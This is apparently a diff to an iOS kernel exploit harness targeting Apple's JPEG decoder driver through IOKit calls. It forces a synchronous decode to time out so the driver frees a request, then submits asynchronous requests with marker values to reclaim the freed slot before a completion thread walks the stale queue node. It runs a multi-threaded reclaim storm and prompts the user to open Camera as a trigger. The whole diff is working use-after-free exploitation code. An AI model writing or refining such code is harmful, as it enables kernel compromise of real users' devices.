@@ -238,7 +238,39 @@ static void reclaimAll(void) {
     }
     usleep(300000);
 
-    /* Phase 2: reclaimer storm runs while the sync decode hangs. */
+    /* Phase 2: same-thread free/reuse cycles.
+       startDecoder_sync() blocks for up to 10s, times out, frees the request,
+       and returns. The very next startDecoder allocation on the same
+       connection should reuse that slot before the completion thread walks
+       the stale queue node. */
+    for (int round = 0; round < 3; round++) {
+        io_connect_t c = 0;
+        kern_return_t opr = IOServiceOpen(svc, mach_task_self(), 0, &c);
+        if (opr != KERN_SUCCESS || !c) {
+            appendLog(@"cycle round=%d open kr=%#x", round, opr);
+            usleep(200000);
+            continue;
+        }
+        AppleJPEGDriverIOStruct input;
+        AppleJPEGDriverIOStruct output = {0};
+        fillInput(&input, srcID, dstID, W, H, 0, 0);
+        size_t outSize = sizeof(output);
+        CFTimeInterval t0 = CFAbsoluteTimeGetCurrent();
+        kern_return_t sr = IOConnectCallStructMethod(c, 1, &input, sizeof(input), &output, &outSize);
+        CFTimeInterval dt = CFAbsoluteTimeGetCurrent() - t0;
+        appendLog(@"cycle round=%d sync kr=%#x dt=%.3fs", round, sr, dt);
+        if (sr == 0xe00002d6) {
+            appendLog(@"cycle round=%d TIMEOUT -> same-conn reclaim", round);
+            int n = submitAsync(c, srcID, dstID, W, H, 10,
+                                0x51510000 + (round << 8), 1);
+            appendLog(@"cycle round=%d reclaim submitted=%d", round, n);
+            usleep(100000);
+        }
+        IOServiceClose(c);
+        appendLog(@"cycle round=%d closed", round);
+    }
+
+    /* Phase 3: reclaimer storm for the Camera trigger. */
     const int RTHREADS = 4;
     __block int32_t rConn = 0, rReq = 0, rFail = 0;
     appendLog(@"reclaimer start threads=%d", RTHREADS);
@@ -263,38 +295,9 @@ static void reclaimAll(void) {
         });
     }
 
-    usleep(100000);
-
-    /* Phase 3: sync decode on a separate connection. Expect kIOReturnTimeout. */
-    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
-        for (int round = 0; round < 3 && !gStop; round++) {
-            io_connect_t c = 0;
-            kern_return_t opr = IOServiceOpen(svc, mach_task_self(), 0, &c);
-            if (opr != KERN_SUCCESS || !c) {
-                appendLog(@"sync round=%d open kr=%#x", round, opr);
-                usleep(200000);
-                continue;
-            }
-            AppleJPEGDriverIOStruct input;
-            AppleJPEGDriverIOStruct output = {0};
-            /* token = 0 => synchronous decode; the driver waits for completion
-               and returns kIOReturnTimeout (0xe00002d6) if the codec is stuck. */
-            fillInput(&input, srcID, dstID, W, H, 0, 0);
-            size_t outSize = sizeof(output);
-            CFTimeInterval t0 = CFAbsoluteTimeGetCurrent();
-            kern_return_t sr = IOConnectCallStructMethod(c, 1, &input, sizeof(input), &output, &outSize);
-            CFTimeInterval dt = CFAbsoluteTimeGetCurrent() - t0;
-            appendLog(@"sync round=%d kr=%#x dt=%.3fs outSize=%zu", round, sr, dt, outSize);
-            IOServiceClose(c);
-        }
-        appendLog(@"sync trigger done");
-    });
-
-    /* Give the sync trigger time to hit the 10s timeout, then keep the
-       reclaimer alive while the user opens Camera. The background task gives
-       us ~30s of execution after the app is backgrounded. */
-    sleep(45);
-    appendLog(@"sync window done; keeping reclaimer alive for Camera");
+    /* Keep the storm alive while Camera is foregrounded. The background task
+       gives us ~30s of execution after the app is backgrounded. */
+    sleep(5);
     beginBackgroundTask();
     showCameraPrompt();
 
